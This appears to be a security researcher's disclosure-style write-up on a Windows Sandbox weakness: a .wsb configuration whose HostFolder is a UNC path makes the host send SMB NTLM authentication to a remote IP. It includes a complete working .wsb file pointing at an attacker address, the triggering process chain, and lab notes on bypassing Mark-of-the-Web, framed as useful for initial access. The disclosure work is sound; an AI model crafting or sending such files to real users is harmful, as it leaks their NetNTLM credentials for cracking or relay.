# Windows Sandbox `.wsb` HostFolder NTLM Leak

Following up on my UNCanny project, I noticed people were interested in that specific UNC-based coercion primitive, even though that project had some clear limitations. So I kept digging around the same idea and wanted to publish something a bit more decent and more practical more practical for initial access.

Windows Sandbox is usually treated as the safe place to open untrusted files, which makes the .wsb config file itself an interesting place to look. Before the sandbox guest is even running, the host still has to parse the config file and prepare the sandbox session and while looking at that setup flow, I focused on MappedFolders. The normal documented use case is simple, we map a local host folder into the sandbox. So the remaining obvious question was simply what happens if HostFolder is not a local path, but a UNC path instead?

It turns out the host will try to authenticate to it.

```xml
<Configuration>
  <Networking>Disable</Networking>
  <MappedFolders>
    <MappedFolder>
      <HostFolder>\\192.168.139.132\wsbtest</HostFolder>
      <SandboxFolder>C:\Users\WDAGUtilityAccount\Desktop\share</SandboxFolder>
      <ReadOnly>true</ReadOnly>
    </MappedFolder>
  </MappedFolders>
</Configuration>
```

Opening this `.wsb` caused the Windows host to perform SMB NTLM authentication to my IP. The sandbox may fail to initialize afterward because the target is not a real accessible share, but the authentication has already happened.

![alt text](<img.png>)

The process path is roughly:

```text
.wsb open
  -> WindowsSandbox.exe "%1"
  -> WindowsSandboxRemoteSession.exe <wsb path>
  -> host-side mapped folder setup
  -> SMB authentication to HostFolder UNC
```

The important detail is that `Networking=Disable` applies to the guest sandbox networking state. It does not prevent the host from resolving resources needed to create the sandbox session. `ReadOnly=true` also does not help here; read-only controls write access after mapping, not authentication to the mapped path.

I did not find public prior art describing `.wsb` `HostFolder` UNC paths as a NetNTLM/coercion primitive. The closest public references discuss `.wsb` mapped folders and UNC mapping behavior as configuration/functionality, not credential exposure:

- Microsoft `.wsb` documentation: https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-configure-using-wsb-file
- Windows Sandbox UNC mapped folder issue: https://github.com/microsoft/Windows-Sandbox/issues/63
- Related SuperUser thread: https://superuser.com/questions/1863728/starting-windows-sandbox-with-mapped-folder-from-network-share-on-windows-11-24h

Notes:
- Direct IP UNC worked: `\\192.168.139.132\wsbtest`
- Hostname UNC worked too, with normal name resolution/poisoning
- Opening the `.wsb` through file association triggered SMB authentication
- Explicit `WindowsSandbox.exe <file.wsb>` also triggered SMB authentication
- `LogonCommand` with a UNC path did not trigger in this harness
- `file://host/share` in `HostFolder` did not trigger
- `wsb.exe <file.wsb>` did not trigger on the tested host
- Mark-of-the-Web blocks normal open before Sandbox parsing unless accepted; direct `WindowsSandbox.exe <motw.wsb>` still parsed and triggered auth in my lab
